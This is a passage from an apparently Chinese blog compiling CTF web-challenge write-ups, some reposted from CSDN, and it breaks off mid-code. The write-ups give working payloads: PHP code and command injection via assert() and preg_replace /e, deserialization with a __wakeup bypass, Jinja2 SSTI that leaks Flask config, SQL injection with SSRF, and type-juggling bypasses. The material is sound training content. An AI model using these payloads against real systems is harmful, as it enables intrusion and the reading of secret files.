+scandir(directory,sorting_order,context);<br>
+文件读取函数:<br>
+readfile(filename,include_path,context)<br>
+file_get_contents(path,include_path,context,start,max_length)<br>
+字符转换函数:<br>
+chr(ascii)<br>
+ord(string)<br>
+base_convert(number,frombase,tobase);</p>
+<p>现在目标就是拼接除payloadscandir(/)来搜索目录。首先因为/在黑名单中，所以需要用其他方式去得出，可以使用chr(47)来表示。这样我们第一个payload就出了? num=var_dump(scandir(chr(47)))。var_dump只是打印函数，也可以换成print_r()，? num=print_r(scandir(chr(47)))。如果scandir这个词也被过滤的话，还可以使用base_convert()来拼接。<br>
+如? num=print_r(base_convert(61693386291,10,36)(chr(47)))<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1622981977006.png" alt="" loading="lazy"><br>
+可以看到输出的目录列表中包含f1agg这个文件。那接下来需要构造的payload就是readfile(/f1agg)。按照之前的办法构造即可：<br>
+? num=readfile(chr(47).f1agg)<br>
+? num=file_get_contents(chr(47).f1agg)<br>
+? num=base_convert(2146934604002,10,36)(chr(47).f1agg)<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1622981980736.png" alt="" loading="lazy"><br>
+————————————————<br>
+版权声明：本文为CSDN博主「     晓德」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>
+原文链接：https://blog.csdn.net/weixin_42271850/article/details/105027498</p>
+<h1 id="极客大挑战-2019php">[极客大挑战 2019]PHP</h1>
+<p>说到文件备份，首先把网站的目录给爆破出来，使用dirsearch<br>
+dirsearch</p>
+<p>一款基于python3的目录爆破工具<br>
+下载地址</p>
+<p>https://github.com/maurosoria/dirsearch<br>
+使用</p>
+<p>-u 指定url</p>
+<p>-e 指定网站语言</p>
+<p>-w 可以加上自己的字典（带上路径）</p>
+<p>-r 递归跑（查到一个目录后，在目录后在重复跑，很慢，不建议用）</p>
+<p>进入dirsearch目录后</p>
+<p>执行./dirsearch.py -u 127.0.0.1 -e php类似的目录，这里我们使用</p>
+<pre><code>./dirsearch.py -u http://71f04e34-1537-41f0-8c4f-e3de12f432b9.node3.buuoj.cn -e php
+</code></pre>
+<p><img src="https://https://jinqipiaopiao.github.io//post-images/1622983936799.png" alt="" loading="lazy"><br>
+里面文件是真的多，不过我只要备份的文件<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1622983940481.png" alt="" loading="lazy"><br>
+在网址后面直接加上www.zip，下载到本地解压查看，发现了这么一些文件</p>
+<p>image-20200502233429323<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1622983945007.png" alt="" loading="lazy"><br>
+打开index.php文<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1622983950671.png" alt="" loading="lazy"><br>
+在里面有一段这样的话，里面加载了一个class.php文件，然后采用get传递一个select参数，随后将之反序列化</p>
+<p>打开class.php</p>
+<pre><code>function __wakeup(){
+$this-&gt;username = 'guest';
+}
+
+function __destruct(){
+if ($this-&gt;password != 100) {
+echo &quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;;
+echo &quot;You name is: &quot;;
+echo $this-&gt;username;echo &quot;&lt;/br&gt;&quot;;
+echo &quot;You password is: &quot;;
+echo $this-&gt;password;echo &quot;&lt;/br&gt;&quot;;
+die();
+}
+if ($this-&gt;username === 'admin') {
+global $flag;
+echo $flag;
+}else{
+echo &quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can't give you the flag!&quot;;
+die();
+
+        
+}
+}
+}
+?&gt;
+根据代码的意思可以知道，如果password=100，username=admin，在执行__destruct()的时候可以获得flag，所以我们需要达成这些要求
+</code></pre>
+<p>构造序列化</p>
+<pre><code>&lt;?php
+
+class Name{
+private $username = 'nonono';
+private $password = 'yesyes';
+
+public function __construct($username,$password){
+$this-&gt;username = $username;
+$this-&gt;password = $password;
+}
+}
+$a = new Name('admin', 100);
+var_dump(serialize($a));
+
+?&gt;
+</code></pre>
+<p>保存文件执行一次<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1622983957652.png" alt="" loading="lazy"><br>
+得到的序列化为，建议手动去打一遍</p>
+<pre><code>O:4:&quot;Name&quot;:2:{s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;i:100;}
+</code></pre>
+<p>到了这一步，问题就来了，在反序列化的时候会首先执行__wakeup()魔术方法，但是这个方法会把我们的username重新赋值，所以我们要考虑的就是怎么跳过__wakeup()，而去执行__destruct<br>
+跳过__wakeup()</p>
+<p>在反序列化字符串时，属性个数的值大于实际属性个数时，会跳过 __wakeup()函数的执行</p>
+<p>因此我们将序列化这样设置</p>
+<pre><code>O:4:&quot;Name&quot;:3:{s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;i:100;}
+</code></pre>
+<p>不过还是没有结束，因为这个声明变量是private</p>
+<p>private 声明的字段为私有字段，只在所声明的类中可见，在该类的子类和该类的对象实例中均不可见。因此私有字段的字段名在序列化时，类名和字段名前面都会加上0的前缀。字符串长度也包括所加前缀的长度</p>
+<p>我们再次改造一下序列化</p>
+<pre><code>O:4:&quot;Name&quot;:3:{s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;i:100;}
+</code></pre>
+<p>测试</p>
+<p>使用get请求把我们准备好的序列化当作select的参数传递过去</p>
+<pre><code>http://c7c61c82-0812-45e5-a51a-0b8c123f19ad.node3.buuoj.cn/?select=O:4:%22Name%22:3:{s:14:%22%00Name%00username%22;s:5:%22admin%22;s:14:%22%00Name%00password%22;i:100;}
+</code></pre>
+<p>前面网址记得换成自己的就行<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1622983963301.png" alt="" loading="lazy"></p>
+<h1 id="shrine">shrine</h1>
+<p>1.SSTI模板注入：<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1623303565831.png" alt="" loading="lazy"><br>
+模板注入涉及的是服务端Web应用使用模板引擎渲染用户请求的过程</p>
+<p>服务端把用户输入的内容渲染成模板就可能造成SSTI(Server-Side Template Injection)</p>
+<p>模板引擎（这里特指用于Web开发的模板引擎）是为了使用户界面与业务数据（内容）分离而产生的，它可以生成特定格式的文档，用于网站的模板引擎就会生成一个标准的HTML文档。一些模板引擎：Smarty，Mako，Jinja2，Jade，Velocity，Freemaker和Twig</p>
+<p><strong>模板引擎</strong></p>
+<p>模板引擎可以让（网站）程序实现界面与数据分离，业务代码与逻辑代码的分离，这大大提升了开发效率，良好的设计也使得代码重用变得更加容易。与此同时，它也扩展了黑客的攻击面。除了常规的 XSS 外，注入到模板中的代码还有可能引发 RCE（远程代码执行）。通常来说，这类问题会在博客，CMS，wiki 中产生。虽然模板引擎会提供沙箱机制，攻击者依然有许多手段绕过它。</p>
+<p><strong>模板渲染</strong></p>
+<p>首先 模板渲染分解为前端渲染和后端渲染，还有浏览器渲染。</p>
+<p>模板只是一种提供给程序来解析的一种语法，换句话说，模板是用于从数据（变量）到实际的视觉表现（HTML代码）这项工作的一种实现手段，而这种手段不论在前端还是后端都有应用。<br>
+通俗点理解：拿到数据，塞到模板里，然后让渲染引擎将赛进去的东西生成 html 的文本，返回给浏览器，这样做的好处展示数据快，大大提升效率。</p>
+<p><strong>服务端模板注入</strong></p>
+<p>服务器执行了我们传过去的数据。每当服务器用模板引擎解析用户的输入时，这类问题都有可能发生。除了常规的输入外，攻击者还可以通过 LFI（文件包含）触发它。模板注入和 SQL 注入的产生原因有几分相似——都是将未过滤的数据传给引擎解析。</p>
+<p>这里模板注入前加“服务端”，这是为了和 jQuery，KnockoutJS 产生的客户端模板注入区别开来。通常的来讲，前者甚至可以让攻击者执行任意代码，而后者只能 XSS。</p>
+<p><strong>模板引擎注入</strong></p>
+<p>一些模板引擎：Smarty，Mako，Jinja2，Jade，Velocity，Freemaker和Twig，模板注入是一种注入攻击，可以产生一些特别有趣的影响。对于AngularJS的情况，这可能意味着XSS，并且在服务器端注入的情况下可能意味着远程代码执行。重点来了，不同引擎有不同的测试以及注入方式！</p>
+<p>flask/jinja2模板注入</p>
+<p>PHP/模版引擎Twig注入</p>
+<p><strong>tplmap</strong></p>
+<p>利用tplmap这个工具进行检测是否有模板注入漏洞，用法有点像sqlmap,都是基于python的。</p>
+<p><strong>解题</strong></p>
+<p>模板渲染接受的参数需要用两个大括号括起来<code>{{}}</code>模板注入也在大括号里构造<br>
+题目源码：</p>
+<pre><code>import flask
+import os
+
+app = flask.Flask(__name__)
+
+app.config['FLAG'] = os.environ.pop('FLAG')
+
+@app.route('/')
+def index():
+return open(__file__).read()
+
+@app.route('/shrine/&lt;path:shrine&gt;')
+def shrine(shrine):
+
+def safe_jinja(s):
+s = s.replace('(', '').replace(')', '')
+blacklist = ['config', 'self']
+return ''.join(['{{% set {}=None%}}'.format(c) for c in blacklist]) + s
+
+return flask.render_template_string(safe_jinja(shrine))
+
+if __name__ == '__main__':
+app.run(debug=True)
+
+首先在shrine路径下测试ssti能正常执行
+
+/shrine/{{ 2+2 }}
+</code></pre>
+<figure data-type="image" tabindex="2"><img src="https://https://jinqipiaopiao.github.io//post-images/1623303557004.png" alt="" loading="lazy"></figure>
+<p>接着分析源码</p>
+<pre><code>app.config['FLAG'] = os.environ.pop('FLAG')
+</code></pre>
+<p>注册了一个名为FLAG的config，猜测这就是flag，如果没有过滤可以直接{{config}}即可查看所有app.config内容，但是这题设了黑名单<code>[‘config’,‘self’]</code>并且过滤了括号</p>
+<pre><code>return ''.join(['{{% set {}=None%}}'.format(c) for c in blacklist]) + s
+</code></pre>
+<p>上面这行代码把黑名单的东西遍历并设为空，例如：</p>
+<pre><code>/shrine/{{config}}
+</code></pre>
+<p>不过python还有一些内置函数，比如url_for和get_flashed_messages</p>
+<pre><code>/shrine/{{url_for.__globals__}}
+</code></pre>
+<p><img src="https://https://jinqipiaopiao.github.io//post-images/1623303572197.png" alt="" loading="lazy"><br>
+看到current_app意思应该是当前app，那我们就当前app下的config：</p>
+<pre><code>/shrine/{{url_for.__globals__['current_app'].config}}
+</code></pre>
+<p><img src="https://https://jinqipiaopiao.github.io//post-images/1623303575406.png" alt="" loading="lazy"><br>
+get_flashed_messages</p>
+<p>返回之前在Flask中通过 flash() 传入的闪现信息列表。把字符串对象表示的消息加入到一个消息队列中，然后通过调用 get_flashed_messages() 方法取出(闪现信息只能取出一次，取出后闪现信息会被清空)。</p>
+<p>同理</p>
+<pre><code>/shrine/{{get_flashed_messages.__globals__['current_app'].config['FLAG']}}
+</code></pre>
+<p><strong>防御</strong><br>
+防御对于不同的模板引擎，防御方案也不相同。但做好对用户输入的清理/过滤，将能大大的降低此类问题带来的安全威胁。<br>
+另一个选择是创建一个安全加固/沙箱环境，禁用或删除潜在的危险指令。</p>
+<p>为了防止此类漏洞，你应该像使用eval()函数一样处理字符串加载功能。尽可能加载静态模板文件。</p>
+<p>注意：我们已经确定此功能类似于require()函数调用。因此，你也应该防止本地文件包含（LFI）漏洞。不要允许用户控制此类文件或其内容的路径。</p>
+<p>另外，无论在何时，如果需要将动态数据传递给模板，不要直接在模板文件中执行，你可以使用模板引擎的内置功能来扩展表达式，实现同样的效果。</p>
+<h1 id="mfw">mfw</h1>
+<p>题目描述:<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1623307641787.png" alt="" loading="lazy"><br>
+点开每个页面发现啥也没有，所以就查看源码发现就有一句话<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1623307699213.png" alt="" loading="lazy"><br>
+解题思路：<br>
+利用.git源码泄漏漏洞，使用githack(GitHack.py http://www.example.com/.git/）得到网站源码<br>
+注意：Githack要用python2来运行<br>
+观察上图，我们可以获得两个比较重要的信息<br>
+1.该网站使用git托管源代码，以及用PHP编写<br>
+2.有一个flag文件(猜测后缀为.php)</p>
+<p>怀疑存在.git源码泄露，于是尝试访问或者是dirsearch扫描目录<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1623308775511.png" alt="" loading="lazy"><br>
+利用git hack下载源码，详细代码自己发现获得一下的信息<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1623309291752.png" alt="" loading="lazy"><br>
+1.关键的代码<br>
+2.template目录下存在flag.php文件（你可以尝试cat一下）</p>
+<pre><code>&lt;?php
+
+if (isset($_GET['page'])) {
+$page = $_GET['page'];
+} else {
+$page = &quot;home&quot;;
+}
+
+$file = &quot;templates/&quot; . $page . &quot;.php&quot;;//用于拼接形成目录路径
+
+// I heard '..' is dangerous!
+assert(&quot;strpos('$file', '..') === false&quot;) or die(&quot;Detected hacking attempt!&quot;);
+
+// TODO: Make this look nice
+assert(&quot;file_exists('$file')&quot;) or die(&quot;That file doesn't exist!&quot;);
+?&gt;
+</code></pre>
+<p>发现一个assert()函数，想到可以是任意代码执行漏洞，而且对于尝试$page没有任何的控制直接拼接首先我们确定的最后想要的肯定是利用assert()函数执行cat./template/flag.php获得flag.那肯定要破坏原来的assert的结构才能，使得我们的目标才能达成</p>
+<pre><code>assert(&quot;strpos('$file','..') === false&quot;)
+assert(&quot;file_exists('$file')&quot;)
+</code></pre>
+<p>那么我们就尝试构造</p>
+<pre><code>?page=abc') or system(&quot;cat templates/flag.php&quot;);//    这里建议使用单引号便于后期区分
+</code></pre>
+<p>传入后就变成</p>
+<pre><code>assert(&quot;strpos('/template/?page=abc') or system(&quot;cat templates/flag.php&quot;);//.php&quot;
+</code></pre>
+<p>注意//还是作为$file还是作为字符串的注意区分<br>
+替换</p>
+<pre><code>assert(&quot;strpos('/template/?page=abc') or system(&quot;cat templates/flag.php&quot;);//.php', '..') === false&quot;)        由于strpos函数报错,因此运行我们构造的语句or后面的语句
+</code></pre>
+<p>放回页面为空,不要慌,查看源码你就会发现flag<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1623308781774.png" alt="" loading="lazy"></p>
+<p>————————————————<br>
+版权声明：本文为CSDN博主「网安小小白」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>
+原文链接：https://blog.csdn.net/weixin_44800419/article/details/107780429</p>
+<h1 id="web2">web2</h1>
+<p>此题考查的是对于给出一串代码你能看懂并且能把他逆向出来<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1623419118588.png" alt="" loading="lazy"><br>
+此题目已经给出解决方法就是逆向加密</p>
+<pre><code>&lt;?php
+$miwen=&quot;a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws&quot;;
+
+function encode($str){
+$_o=strrev($str);
+// echo $_o;
+    
+for($_0=0;$_0&lt;strlen($_o);$_0++){
+   
+$_c=substr($_o,$_0,1);
+$__=ord($_c)+1;
+$_c=chr($__);
+$_=$_.$_c;   
+} 
+return str_rot13(strrev(base64_encode($_)));
+}
+
+highlight_file(__FILE__);
+/*
+逆向加密算法，解密$miwen就是flag
+*/
+?&gt; 
+</code></pre>
+<p>strrev() 函数：字符串逆置,<br>
+substr() 函数返回字符串的一部分。<br>
+substr(string,start,length) 如果 start 参数是负数且 length 小于或等于 start，则 length 为 0<br>
+base64_encode() 函数 base64加密<br>
+base64_decode() 函数 base64解密<br>
+str_rot13() 函数 对字符串执行 ROT13 编码，如果再次进行编码就会回到原来的形式。<br>
+ord() 函数是 chr() 函数（对于8位的ASCII字符串）或 unichr() 函数（对于Unicode对象）的配对函数，它以一个字符（长度为1的字符串）作为参数，返回对应的 ASCII 数值，或者 Unicode 数值</p>
+<p>解释代码：<br>
+先时将flag字符串逆序，然后每一个ascii码数值+1，然后base64加密，然后逆序，然后再rot13加密</p>
+<p>得到加密的密文：a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws</p>
+<p>然后我们按照人家的加密思想逆运算一下就出来了flag<br>
+&lt;?php</p>
+<pre><code>$_=&quot;a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws&quot;;
+$a=base64_decode(strrev(str_rot13($_)));    此时先将密文进行rot13编码返回到原来的形态，然后逆置，然后进行base64解码
+for($i=0;$i&lt;strlen($a);$i++){
+    
+$_c=substr($a,$i,1);    然后取每一位进行acii码数值-1最后返回即可得到flag
+$__=ord($_c)-1;
+$_c=chr($__);
+$f=$f.$_c;   
+}
+echo(strrev($f)); 
+?&gt; 
+</code></pre>
+<figure data-type="image" tabindex="3"><img src="https://https://jinqipiaopiao.github.io//post-images/1623419583442.png" alt="" loading="lazy"></figure>
+<h1 id="网鼎杯-2018fakebook">[网鼎杯 2018]Fakebook</h1>
+<p>1.打开网站，就两个功能点<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1623422500849.png" alt="" loading="lazy"><br>
+2.先打开join看一下，注册页面，随便输入，注册一下：<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1623422504465.png" alt="" loading="lazy"><br>
+3.发现登陆进来了：（这里有个坑，注册完了之后就不能回退，去测试之前的login页面了，不过可以直接输入login.php回去测试）<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1623422507811.png" alt="" loading="lazy"><br>
+4.发现dawn是个url，点击看一下：（这里我也傻了，我一开始傻里傻气的在username插了个xss，结果没看到这个超链接，在源代码里面发现了之后打开一直转圈圈）<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1623422511498.png" alt="" loading="lazy"><br>
+5.看到url，这里是有注入的，跑一下。（这里过滤了union select，我们用union all select 就可以绕过）。<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1623422515410.png" alt="" loading="lazy"><br>
+6.刚开始跑一脸懵逼，这不就是我们的注册信息吗？跑到data列的时候发现了序列化后的值：<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1623422518564.png" alt="" loading="lazy"><br>
+7.那就要考序列化了。一般不会让我们自己猜，肯定会给源码让我们构造的。线程开1跑dirsearch也会出现429，用自己整理过的御剑跑线程1，发现没跑出来= =。怀疑人生的时候看了wp，好吧，字典拉胯了。<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1623422521641.png" alt="" loading="lazy"><br>
+8.代码审计环节：</p>
+<p>（1）一开始先对几个参数进行初始化：<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1623422527533.png" alt="" loading="lazy"><br>
+（2）重点是这里，查了些资料：<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1623422531165.png" alt="" loading="lazy"><br>
+【*】curl_init ： 初始化一个cURL会话，供curl_setopt(), curl_exec()和curl_close() 函数使用。</p>
+<p>【*】curl_setopt ： 请求一个url。<br>
+其中CURLOPT_URL表示需要获取的URL地址，后面就是跟上了它的值。</p>
+<p>【*】CURLOPT_RETURNTRANSFER 将curl_exec()获取的信息以文件流的形式返回，而不是直接输出。</p>
+<p>【*】curl_exec，成功时返回 TRUE， 或者在失败时返回 FALSE。 然而，如果 CURLOPT_RETURNTRANSFER选项被设置，函数执行成功时会返回执行的结果，失败时返回 FALSE 。</p>
+<p>【*】CURLINFO_HTTP_CODE ：最后一个收到的HTTP代码。<br>
+curl_getinfo：以字符串形式返回它的值，因为设置了CURLINFO_HTTP_CODE，所以是返回的状态码。</p>
+<p>如果状态码不是404，就返回exec的结果。</p>
+<p>（3）再来看看get函数在哪里调用：<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1623422536313.png" alt="" loading="lazy"><br>
+这里就清楚了，传的参数是blog。</p>
+<p>9.差不多知道咋回事了，就是反序列化+ssrf。</p>
+<p>我们注册后，把我们的信息序列化一下，然后存进data。在user界面，取出blog，获取资源。</p>
+<p>两种思路吧？要不注册界面去设置blog，要不用注入设置blog，那肯定是注入简单些。<br>
+因为列名里面没有blog，所以我们要设置的点就是data那里了。</p>
+<p>10.然后懵逼的时候又到了，我要去请求数据了，但是我请求个啥？flag在哪儿= =我去把所有的php文件都尝试了一遍，没发现啥有用的东西：</p>
+<p>（路径是之前注入的时候报错爆出来的，序列化值也不用自己生成，之前注入出来了，改长度和值就行）</p>
+<p>payload：</p>
+<pre><code>?no=-1 union all select 1,2,3,'O:8:&quot;UserInfo&quot;:3:{s:4:&quot;name&quot;;s:1:&quot;1&quot;;s:3:&quot;age&quot;;i:1;s:4:&quot;blog&quot;;s:27:&quot;file:///var/www/html/db.php&quot;;}'
+</code></pre>
+<p>11.无奈还是看了WP，说是扫出来发现有个flag.php。再说一遍，我的字典好拉胯。<br>
+payload:</p>
+<pre><code>/view.php?no=-1 union all select 1,2,3,'O:8:&quot;UserInfo&quot;:3:{s:4:&quot;name&quot;;s:1:&quot;1&quot;;s:3:&quot;age&quot;;i:1;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;}'
+</code></pre>
+<figure data-type="image" tabindex="4"><img src="https://https://jinqipiaopiao.github.io//post-images/1623422050906.png" alt="" loading="lazy"></figure>
+<p>————————————————<br>
+版权声明：本文为CSDN博主「H9_dawn」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>
+原文链接：https://blog.csdn.net/qq_43622442/article/details/1056331</p>
+<h1 id="攻防世界web之ics-05">攻防世界web之ics-05</h1>
+<p>全部点击一遍，只有这个可以有其他界面<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1623511769578.png" alt="" loading="lazy"><br>
+题目描述是 “其他破坏者会利用工控云管理系统设备维护中心的后门入侵系统”</p>
+<p>在后面添加login.php 无果，御剑扫描也无结果，源码也找不到其他东西</p>
+<p>再次点击上面的“云平台设备维护中心”,URL栏有参数?page=index  存在get传值<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1623511773930.png" alt="" loading="lazy"><br>
+page的参数联想到可能存在文件包含漏洞</p>
+<p>引用上面的文章内容</p>
+<p>LFI漏洞的黑盒判断方法：<br>
+单纯的从URL判断的话，URL中path、dir、file、pag、page、archive、p、eng、语言文件等相关关键字眼的时候,可能存在文件包含漏洞</p>
+<p>输入数字没啥用，尝试读取index.php的源码，采用php伪协议</p>
+<pre><code>?page=php://filter/read=convert.base64-encode/resource=index.php
+</code></pre>
+<p>为什么中间要转base64编码，如果不转码，则相当于进行请求网页（继续打开网页）<br>
+输入payload得到一段base64<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1623511778768.png" alt="" loading="lazy"><br>
+然后解码，分析源码<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1623511781656.png" alt="" loading="lazy"><br>
+伪造XFF头来登入系统，同时利用preg_replace函数的漏洞</p>
+<p>preg_replace( pattern , replacement , subject ) :</p>
+<p>搜索 subject 中匹配 pattern 的部分， 以 replacement 进行替换<br>
+当pre_replace的参数pattern输入/e的时候 ,参数replacement的代码当作PHP代码执行<br>
+于是构造payload</p>
+<pre><code>/index.php?pat=/123/e&amp;rep=system(&quot;find+-iname+flag&quot;)&amp;sub=123
+</code></pre>
+<p>”+“号在url中会被解释成空格号，这里用%20也行</p>
+<p>用burpsuite来设置XFF头<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1623511785745.png" alt="" loading="lazy"><br>
+继续查看   %26被url解释成&amp;号   用来连接命令</p>
+<p>&amp;&amp; 前面命令为假直接报错，后面语句不执行（前面命令执行成功，后面的命令也执行）</p>
+<pre><code>index.php?pat=/123/e&amp;rep=system(&quot;cd+./s3chahahaDir/flag%26%26ls&quot;)&amp;sub=123
+</code></pre>
+<p><img src="https://https://jinqipiaopiao.github.io//post-images/1623511788614.png" alt="" loading="lazy"><br>
+最后的payload</p>
+<pre><code>index.php?pat=/123/e&amp;rep=system(&quot;cat+./s3chahahaDir/flag/flag.php&quot;)&amp;sub=123
+</code></pre>
+<figure data-type="image" tabindex="5"><img src="https://https://jinqipiaopiao.github.io//post-images/1623511793656.png" alt="" loading="lazy"></figure>
+<pre><code>cyberpeace{a3f41e3943e9bd48b8084b29e4b27182}
+</code></pre>
+<h1 id="favorite_number">favorite_number</h1>
+<p>一道web题<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1623543663144.png" alt="" loading="lazy"><br>
+题目并没有给我们有用的提示信息<br>
+进入环境<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1623543666979.png" alt="" loading="lazy"><br>
+这个应该是网页的源码<br>
+开始代码审计</p>
+<p>简单的代码审计</p>
+<p>首先是个判断，既要数组强等于，又要首元素不等<br>
+然后是个正则，要求整个字符串都是数字，大小写不敏感，跨行检测<br>
+最后是个黑名单，把常用的都排除了</p>
+<p>我们可以很明显的看到一个麻烦的东西</p>
+<pre><code>if($stuff === $array &amp;&amp; $stuff[0] != ‘admin’) {
+</code></pre>
+<p>这里即要求一个强等于，还要求首元素要不一样<br>
+然后是一个正则，还有一个黑名单<br>
+第一个应该要从php5.5.9自身的漏洞入手，去查查资料<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1623543671657.png" alt="" loading="lazy"><br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1623543675211.png" alt="" loading="lazy"></p>
+<p>问题出在php中key数组的溢出<br>
+https://segmentfault.com/q/1010000003871264<br>
+这个链接是一个类似的题目，刚刚查找到的漏洞就是从这篇文章了解到的<br>
+根据这道题目我们来构建本题的payload</p>
+<pre><code>stuff[4294967296]=admin&amp;stuff[1]=user&amp;num=123456
+</code></pre>
+<p>好，我们构建完成后去尝试一下<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1623543678776.png" alt="" loading="lazy"><br>
+Nice~，成功绕过第一个<br>
+第二个问题就是那个数字检测了，得绕过它我们才可以进行命令查询<br>
+接着查资料<br>
+But，搜了一大堆如何绕过数字检测就是查不到资料<br>
+直接选择了看看大佬的wp<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1623543682104.png" alt="" loading="lazy"><br>
+使用换行符%0a<br>
+本来想着查一下这个会不会有<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1623543727731.png" alt="" loading="lazy"><br>
+直接用bp抓取后成功绕过(这里你先得保证是post传输值否则burp suite抓包后修改发送没有任何返回信息)<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1623543695464.png" alt="" loading="lazy"><br>
+其实到这里题目就已经完成了，因为我们只要输入正确的命令执行语句就可以拿到flag了<br>
+在这里插入图片描述<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1623543737610.png" alt="" loading="lazy"><br>
+首先查询所有信息<br>
+唉~ 这不就出来了吗<br>
+这里我们使用tac来读取文件<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1623543741229.png" alt="" loading="lazy"></p>
+<p>————————————————<br>
+版权声明：本文为CSDN博主「xixihahawuwu」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>
+原文链接：https://blog.csdn.net/xixihahawuwu/article/details/109995990</p>
+<h1 id="lottery">Lottery</h1>
+<p>上来先测试了一下，注册用户，购买彩票，拿到足够的钱，购买flag。大概就这样，发现buy.php页面，买完之后还是buy.php，没有页面的跳转，这让我有点搞不懂。</p>
+<p>所以扫了一下网站，发现有robots.txt，访问发现<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1623548111485.png" alt="" loading="lazy"><br>
+似乎也是Git泄露问题，下载一下试试，拿到很多文件<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1623548115034.png" alt="" loading="lazy"><br>
+发现关键代码在api.php里面<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1623548118277.png" alt="" loading="lazy"><br>
+在买彩票这里的函数：<br>
+其中<code>$numbers</code>来自用户json输入的<code>{&quot;action&quot;:&quot;buy&quot;,&quot;numbers&quot;:&quot;1234567&quot;}</code>,没有检查数据类型，<code>$win_numbers</code>是随机生成的数字字符串<br>
+使用php弱类型松散比较，以&quot;1&quot;为例，和true,1,&quot;1&quot;相等。由于json支持布尔型数据，因此可以包改包构造数据:使你输入的和随机生成的相等所以这里就利用到了php的弱类型比较true和任何字符串比较都相等<br>
+构造<code>{&quot;action&quot;:&quot;buy&quot;,&quot;numbers&quot;:[true,true,true,true,true,true,true]}</code>两次即可<br>
+更多相关知识：https://www.cnblogs.com/LEOGG321/p/13470244.html</p>
+<h1 id="flatscience">FlatScience</h1>
+<p><img src="https://https://jinqipiaopiao.github.io//post-images/1623580034174.png" alt="" loading="lazy"><br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1623580037683.png" alt="" loading="lazy"><br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1623580040702.png" alt="" loading="lazy"><br>
+解法<br>
+我们一个一个点进去发现也就是一些论文之类的<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1623580044067.png" alt="" loading="lazy"><br>
+我们御剑发现了一些东西<br>
+robots。txt<br>
+我们登录试试<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1623580047613.png" alt="" loading="lazy"><br>
+在login页面有报错，我们猜测是sql注入<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1623580051623.png" alt="" loading="lazy"><br>
+他的源码中写到，登录是你不可能绕过的<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1623580055907.png" alt="" loading="lazy"><br>
+这里源码中出现了？debug，可能是一个调试页面，我们访问看看<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1623580060442.png" alt="" loading="lazy"></p>
+<pre><code>&lt;?php
+if(isset($_POST['usr']) &amp;&amp; isset($_POST['pw'])){
+$user = $_POST['usr'];
+$pass = $_POST['pw'];
+
+$db = new SQLite3('../fancy.db');
+    
+$res = $db-&gt;query(&quot;SELECT id,name from Users where name='&quot;.$user.&quot;' and password='&quot;.sha1($pass.&quot;Salz!&quot;).&quot;'&quot;);
+if($res){
+$row = $res-&gt;fetchArray();
+}
+else{
+echo &quot;&lt;br&gt;Some Error occourred!&quot;;
+}
+
+if(isset($row['id'])){
